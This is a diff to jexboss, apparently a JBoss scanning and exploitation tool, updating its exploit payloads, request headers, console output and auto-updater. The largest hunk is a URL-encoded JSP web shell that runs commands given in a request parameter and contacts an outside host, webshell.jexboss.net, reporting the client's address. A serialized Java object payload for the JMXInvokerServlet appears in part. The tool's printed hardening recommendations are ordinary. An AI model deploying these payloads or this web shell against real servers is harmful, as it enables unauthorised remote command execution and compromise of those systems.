@@ -28,7 +28,7 @@ NORMAL = '\033[0m'
 ENDC = '\033[0m'
 
 __author__ = "João Filho Matos Figueiredo <joaomatosf@gmail.com>"
-__version = "1.0.2"
+__version = "1.0.3"
 
 from sys import argv, exit, version_info
 
@@ -164,14 +164,15 @@ def shell_http(url, shell_type):
     :param url: The URL to connect to
     :param shell_type: The type of shell to connect to
     """
+    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+               "Connection": "keep-alive",
+               "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
+
     if shell_type == "jmx-console" or shell_type == "web-console":
         path = '/jbossass/jbossass.jsp?'
     elif shell_type == "JMXInvokerServlet":
         path = '/shellinvoker/shellinvoker.jsp?'
-
-    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-               "Connection": "keep-alive",
-               "User-Agent": "jexboss"}
+        headers['User-Agent'] = "jexboss"
 
     pool.request('GET', url+ path, redirect=False, headers=headers)
 
@@ -238,24 +239,52 @@ def exploit_jmx_console_file_repository(url):
     :param url: The URL to exploit
     :return: The HTTP status code
     """
-    jsp = ("%3C%25%40%20%70%61%67%65%20%69%6D%70%6F%72%74%3D%22%6A%61%76%61"
-           "%2E%75%74%69%6C%2E%2A%2C%6A%61%76%61%2E%69%6F%2E%2A%22%25%3E%3C"
-           "%70%72%65%3E%3C%25%20%69%66%20%28%72%65%71%75%65%73%74%2E%67%65"
-           "%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29%20%21%3D%20"
-           "%6E%75%6C%6C%20%26%26%20%72%65%71%75%65%73%74%2E%67%65%74%48%65"
-           "%61%64%65%72%28%22%75%73%65%72%2D%61%67%65%6E%74%22%29%2E%65%71"
-           "%75%61%6C%73%28%22%6A%65%78%62%6F%73%73%22%29%29%20%7B%20%50%72"
-           "%6F%63%65%73%73%20%70%20%3D%20%52%75%6E%74%69%6D%65%2E%67%65%74"
-           "%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%72%65%71%75%65%73"
-           "%74%2E%67%65%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29"
-           "%29%3B%20%44%61%74%61%49%6E%70%75%74%53%74%72%65%61%6D%20%64%69"
-           "%73%20%3D%20%6E%65%77%20%44%61%74%61%49%6E%70%75%74%53%74%72%65"
-           "%61%6D%28%70%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29"
-           "%29%3B%20%53%74%72%69%6E%67%20%64%69%73%72%20%3D%20%64%69%73%2E"
-           "%72%65%61%64%4C%69%6E%65%28%29%3B%20%77%68%69%6C%65%20%28%20%64"
-           "%69%73%72%20%21%3D%20%6E%75%6C%6C%20%29%20%7B%20%6F%75%74%2E%70"
-           "%72%69%6E%74%6C%6E%28%64%69%73%72%29%3B%20%64%69%73%72%20%3D%20"
-           "%64%69%73%2E%72%65%61%64%4C%69%6E%65%28%29%3B%20%7D%20%7D%25%3E")
+    jsp = ("%3C%25%40%20%70%61%67%65%20%69%6D%70%6F%72%74%3D%22%6A%61%76%61%2E%75"
+           "%74%69%6C%2E%2A%2C%6A%61%76%61%2E%69%6F%2E%2A%2C%20%6A%61%76%61%2E%6E%65"
+           "%74%2E%2A%22%20%70%61%67%65%45%6E%63%6F%64%69%6E%67%3D%22%55%54%46%2D%38"
+           "%22%25%3E%3C%70%72%65%3E%3C%25%69%66%20%28%72%65%71%75%65%73%74%2E%67%65"
+           "%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29%20%21%3D%20%6E%75%6C"
+           "%6C%29%20%7B%55%52%4C%20%75%72%6C%20%3D%20%6E%65%77%20%55%52%4C%28%22%68"
+           "%74%74%70%3A%2F%2F%77%65%62%73%68%65%6C%6C%2E%6A%65%78%62%6F%73%73%2E%6E"
+           "%65%74%2F%22%29%3B%20%48%74%74%70%55%52%4C%43%6F%6E%6E%65%63%74%69%6F%6E"
+           "%20%63%68%65%63%6B%20%3D%20%28%48%74%74%70%55%52%4C%43%6F%6E%6E%65%63%74"
+           "%69%6F%6E%29%20%75%72%6C%2E%6F%70%65%6E%43%6F%6E%6E%65%63%74%69%6F%6E%28"
+           "%29%3B%63%68%65%63%6B%2E%73%65%74%52%65%71%75%65%73%74%50%72%6F%70%65%72"
+           "%74%79%28%22%55%73%65%72%2D%41%67%65%6E%74%22%2C%20%72%65%71%75%65%73%74"
+           "%2E%67%65%74%52%65%6D%6F%74%65%41%64%64%72%28%29%29%3B%53%74%72%69%6E%67"
+           "%20%77%72%69%74%65%70%65%72%6D%69%73%73%69%6F%6E%20%3D%20%28%6E%65%77%20"
+           "%44%61%74%65%28%29%2E%74%6F%53%74%72%69%6E%67%28%29%2E%73%70%6C%69%74%28"
+           "%22%3A%22%29%5B%30%5D%2B%22%68%2E%6C%6F%67%22%29%2E%72%65%70%6C%61%63%65"
+           "%41%6C%6C%28%22%20%22%2C%20%22%2D%22%29%3B%20%53%74%72%69%6E%67%20%73%68"
+           "%5B%5D%20%3D%20%72%65%71%75%65%73%74%2E%67%65%74%50%61%72%61%6D%65%74%65"
+           "%72%28%22%70%70%70%22%29%2E%73%70%6C%69%74%28%22%20%22%29%3B%69%66%20%28"
+           "%21%6E%65%77%20%46%69%6C%65%28%22%63%68%65%63%6B%5F%22%2B%77%72%69%74%65"
+           "%70%65%72%6D%69%73%73%69%6F%6E%29%2E%65%78%69%73%74%73%28%29%29%7B%20%50"
+           "%72%69%6E%74%57%72%69%74%65%72%20%77%72%69%74%65%72%20%3D%20%6E%65%77%20"
+           "%50%72%69%6E%74%57%72%69%74%65%72%28%22%63%68%65%63%6B%5F%22%2B%77%72%69"
+           "%74%65%70%65%72%6D%69%73%73%69%6F%6E%29%3B%20%63%68%65%63%6B%2E%67%65%74"
+           "%49%6E%70%75%74%53%74%72%65%61%6D%28%29%3B%77%72%69%74%65%72%2E%63%6C%6F"
+           "%73%65%28%29%3B%20%7D%20%65%6C%73%65%20%69%66%20%28%73%68%5B%30%5D%2E%63"
+           "%6F%6E%74%61%69%6E%73%28%22%69%64%22%29%20%7C%7C%20%73%68%5B%30%5D%2E%63"
+           "%6F%6E%74%61%69%6E%73%28%22%69%70%63%6F%6E%66%69%67%22%29%29%20%63%68%65"
+           "%63%6B%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29%3B%20%74%72%79"
+           "%20%7B%20%50%72%6F%63%65%73%73%20%70%3B%20%69%66%20%28%53%79%73%74%65%6D"
+           "%2E%67%65%74%50%72%6F%70%65%72%74%79%28%22%6F%73%2E%6E%61%6D%65%22%29%2E"
+           "%74%6F%4C%6F%77%65%72%43%61%73%65%28%29%2E%69%6E%64%65%78%4F%66%28%22%77"
+           "%69%6E%22%29%20%3E%20%30%29%7B%70%20%3D%20%52%75%6E%74%69%6D%65%2E%67%65"
+           "%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%22%63%6D%64%2E%65%78%65"
+           "%20%2F%63%20%22%2B%73%68%29%3B%20%7D%20%65%6C%73%65%20%7B%70%20%3D%20%52"
+           "%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63"
+           "%28%73%68%29%3B%7D%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%20%64%20"
+           "%3D%20%6E%65%77%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6E%65%77"
+           "%20%49%6E%70%75%74%53%74%72%65%61%6D%52%65%61%64%65%72%28%70%2E%67%65%74"
+           "%49%6E%70%75%74%53%74%72%65%61%6D%28%29%29%29%3B%20%53%74%72%69%6E%67%20"
+           "%64%69%73%72%20%3D%20%64%2E%72%65%61%64%4C%69%6E%65%28%29%3B%20%77%68%69"
+           "%6C%65%28%64%69%73%72%20%21%3D%20%6E%75%6C%6C%29%20%7B%6F%75%74%2E%70%72"
+           "%69%6E%74%6C%6E%28%64%69%73%72%29%3B%64%69%73%72%20%3D%20%64%2E%72%65%61"
+           "%64%4C%69%6E%65%28%29%3B%7D%7D%63%61%74%63%68%28%45%78%63%65%70%74%69%6F"
+           "%6E%20%65%29%7B%6F%75%74%2E%70%72%69%6E%74%6C%6E%28%22%55%6E%6B%6E%6F%77"
+           "%6E%20%63%6F%6D%6D%61%6E%64%2E%22%29%3B%7D%7D%25%3E")
 
     payload = ("/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service="
                "DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0="
@@ -341,6 +370,8 @@ def exploit_jmx_invoker_file_repository(url):
                "\x74\x69\x6f\x6e\x4b\x65\x79\xb8\xfb\x72\x84\xd7\x93\x85\xf9\x02"
                "\x00\x01\x49\x00\x07\x6f\x72\x64\x69\x6e\x61\x6c\x78\x70\x00\x00"
                "\x00\x04\x70\x78")
+
+
 
     headers = {"Content-Type": "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",
                "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
@@ -491,18 +522,18 @@ def main():
     # resume results
     if list(scan_results.values()).count(200) > 0:
         banner()
-        print(RED + " Results: potentially compromised server!" + ENDC)
+        print(RED + BOLD+" Results: potentially compromised server!" + ENDC)
         print(GREEN + " * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n"
-                      " Recommendations: \n"
-                      " - Remove web consoles and services that are not used, eg:\n"
+             +BOLD+   " Recommendations: \n" +ENDC+
+              GREEN+  " - Remove web consoles and services that are not used, eg:\n"
                       "    $ rm web-console.war\n"
                       "    $ rm http-invoker.sar\n"
                       "    $ rm jmx-console.war\n"
                       "    $ rm jmx-invoker-adaptor-server.sar\n"
                       "    $ rm admin-console.war\n"
-                      " - Use a reverse proxy (eg. nginx, apache, f5)\n"
+                      " - Use a reverse proxy (eg. nginx, apache, F5)\n"
                       " - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)\n"
-                      " - Search vestiges of exploitation within the directories \"deploy\" or \"management\".\n\n"
+                      " - Search vestiges of exploitation within the directories \"deploy\" and \"management\".\n\n"
                       " References:\n"
                       "   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
                       "   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
@@ -514,11 +545,11 @@ def main():
               "   The server is not vulnerable to bugs tested ... :D\n\n" + ENDC)
     # infos
     print(ENDC + " * Info: review, suggestions, updates, etc: \n" +
-          "   https://github.com/joaomatosf/jexboss\n"
-          "   joaomatosf@gmail.com\n")
+          "   https://github.com/joaomatosf/jexboss\n")
 
     print(GREEN + BOLD + " * DONATE: " + ENDC + "Please consider making a donation to help improve this tool,\n"
                                                 "           including research to new versions of JBoss and zero days. \n\n" +
+          GREEN + BOLD + " * Paypal: " + ENDC + " joaomatosf@gmail.com \n" +
           GREEN + BOLD + " * Bitcoin Address: " + ENDC + " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n" +
           GREEN + BOLD + " * URI: " + ENDC + " bitcoin:14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C?label=jexboss\n")
 
@@ -547,10 +578,11 @@ def auto_update():
         print(RED + " * Error: Could not complete the download of the new version. Check your internet connection." + ENDC)
         return False
     with open('master.zip', 'wb') as f:
-       f.write(r.data)
+        f.write(r.data)
     z = ZipFile('master.zip', 'r')
     print(GREEN + " * Extracting new version..." +ENDC)
     z.extractall(path='.')
+    z.close()
     os.remove('master.zip')
     path_new_version = '.' + os.path.sep + 'jexboss-master'
     print(GREEN + " * Replacing the current version with the new version..."  + ENDC)
